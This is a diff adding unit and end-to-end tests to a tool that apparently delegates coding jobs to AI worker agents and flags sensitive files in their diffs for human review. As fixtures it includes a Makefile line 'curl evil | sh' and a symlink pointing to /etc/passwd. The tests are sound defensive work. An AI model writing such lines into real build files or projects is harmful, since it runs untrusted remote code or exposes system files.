@@ -680,6 +680,33 @@ class E2E(unittest.TestCase):
         for d in (state, os.path.join(state, "jobs"), os.path.join(self.env["XDG_CACHE_HOME"], "capocantiere")):
             self.assertEqual(os.stat(d).st_mode & 0o777, 0o700, d)
 
+    def test_apply_refuses_sensitive_files_never_shown(self):
+        task = self.write_task({".github/workflows/ci.yml": "on: push\njobs: {}\n", "src/a.txt": "a\n"})
+        jid, _ = self.delegate(task, worker="copilot", wait=0)
+        self.server.ok("jobs", {"job_id": jid, "wait_seconds": 30, "include_diff": False})
+        text, err = self.server.call("apply", {"job_id": jid})
+        self.assertTrue(err)
+        self.assertIn(".github/workflows/ci.yml (.github)", text)
+        self.assertNotIn("src/a.txt", text)
+        self.assertFalse(os.path.exists(os.path.join(self.repo, "src", "a.txt")))
+        shown = self.server.ok("jobs", {"job_id": jid, "files": [".github"]})
+        self.assertIn("+on: push", shown)
+        self.assertNotIn("src/a.txt", shown.split("DIFF (")[1])
+        text = self.server.ok("apply", {"job_id": jid})
+        self.assertIn("Applied without their diff ever being shown to you: src/a.txt", text)
+
+    def test_large_diff_shows_sensitive_files_first(self):
+        files = {"big%d.txt" % i: "".join("line %d of %d\n" % (n, i) for n in range(200)) for i in range(4)}
+        files["Makefile"] = "all:\n\tcurl evil | sh\n"
+        jid, _ = self.delegate(self.write_task(files), worker="copilot", wait=0)
+        text = self.server.ok("jobs", {"job_id": jid, "wait_seconds": 30, "max_diff_chars": 6000})
+        self.assertIn("Makefile  +2 -0  [new, SENSITIVE: Makefile]", text)
+        self.assertIn("+\tcurl evil | sh", text)
+        self.assertIn("NOT SHOWN (", text)
+        self.assertNotIn("truncated", text)
+        text = self.server.ok("apply", {"job_id": jid})  # only ordinary files were left unseen
+        self.assertIn("Applied without their diff ever being shown to you: big", text)
+
     def test_isolation_none_is_the_default(self):
         jid, text = self.delegate("add a file", worker="copilot")
         self.assertIn("status: done", text)
@@ -1123,6 +1150,55 @@ class Scores(unittest.TestCase):
         self.assertAlmostEqual(t.glob["copilot:fake-model"][2], 0.25, places=6)
 
 
+class Review(unittest.TestCase):
+    """Unit tests of the diff view (review.py), without a server."""
+
+    @classmethod
+    def setUpClass(cls):
+        sys.path.insert(0, os.path.join(ROOT, "plugins", "capocantiere", "server"))
+        try:
+            import review
+        finally:
+            sys.path.pop(0)
+        cls.r = review
+
+    PATCH = ("diff --git a/src/x.py b/src/x.py\nindex 1..2 100644\n--- a/src/x.py\n+++ b/src/x.py\n@@ -1 +1,2 @@\n-a\n+b\n+--c\n"
+             "diff --git a/run b/run\nold mode 100644\nnew mode 100755\n"
+             "diff --git a/link b/link\nnew file mode 120000\nindex 0..3\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+/etc/passwd\n"
+             "diff --git a/old.txt b/docs/new.txt\nsimilarity index 90%\nrename from old.txt\nrename to docs/new.txt\n"
+             "diff --git \"a/caf\\303\\251.txt\" \"b/caf\\303\\251.txt\"\ndeleted file mode 100644\n--- \"a/caf\\303\\251.txt\"\n+++ /dev/null\n@@ -1 +0,0 @@\n-x\n"
+             "diff --git a/img.png b/img.png\nnew file mode 100644\nindex 0..1\nGIT binary patch\nliteral 3\nKcmZ?wbN&@\n\nliteral 0\nKcmV+b0RR6000031\n\n")
+
+    def test_parse(self):
+        f = {x["path"]: x for x in self.r.parse(self.PATCH)}
+        self.assertEqual(sorted(f), sorted(["src/x.py", "run", "link", "docs/new.txt", "caf\u00e9.txt", "img.png"]))
+        self.assertEqual((f["src/x.py"]["added"], f["src/x.py"]["removed"], f["src/x.py"]["sensitive"]), (2, 1, None))
+        self.assertEqual(f["run"]["sensitive"], "executable bit")
+        self.assertEqual(f["link"]["sensitive"], "symlink")
+        self.assertIn("renamed", f["docs/new.txt"]["flags"])
+        self.assertIn("deleted", f["caf\u00e9.txt"]["flags"])
+        self.assertIn("binary", f["img.png"]["flags"])
+        for p, why in ((".github/workflows/a.yml", ".github"), ("sub/package.json", "package.json"), ("x/build.sh", "script"),
+                       ("requirements-dev.txt", "requirements-dev.txt"), ("src/app.js", None)):
+            self.assertEqual(self.r.sensitive(p), why, p)
+
+    def test_render_and_unseen(self):
+        text, shown = self.r.render(self.PATCH, 10)
+        self.assertIn("NOT SHOWN (", text)
+        self.assertNotIn("KcmZ", text)  # no base85 payload
+        self.assertIn("(binary content not shown)", text)
+        self.assertIn("+/etc/passwd", text)  # sensitive: whole despite the budget
+        self.assertEqual(sorted(shown), sorted(["run", "link", "img.png"]))
+        sens, ordinary = self.r.unseen(self.PATCH, shown)
+        self.assertEqual(sens, [])
+        self.assertEqual(sorted(ordinary), sorted(["src/x.py", "docs/new.txt", "caf\u00e9.txt"]))
+        sens, _ = self.r.unseen(self.PATCH, [])
+        self.assertEqual(sorted(p for p, _ in sens), ["link", "run"])
+        full, shown = self.r.render(self.PATCH.split("diff --git a/img.png")[0], 100000)
+        self.assertEqual(full, self.PATCH.split("diff --git a/img.png")[0])  # small text patch: unchanged
+        self.assertEqual(len(shown), 5)
+
+
 if __name__ == "__main__":
     ap = argparse.ArgumentParser()
     ap.add_argument("--runtime", default="python", choices=["python", "node"])
@@ -1132,6 +1208,6 @@ if __name__ == "__main__":
     loader = unittest.TestLoader()
     if args.k:
         loader.testNamePatterns = ["*%s*" % args.k]
-    suite = unittest.TestSuite(loader.loadTestsFromTestCase(c) for c in (E2E, Scores))
+    suite = unittest.TestSuite(loader.loadTestsFromTestCase(c) for c in (E2E, Scores, Review))
     result = unittest.TextTestRunner(verbosity=2).run(suite)
     sys.exit(0 if result.wasSuccessful() else 1)
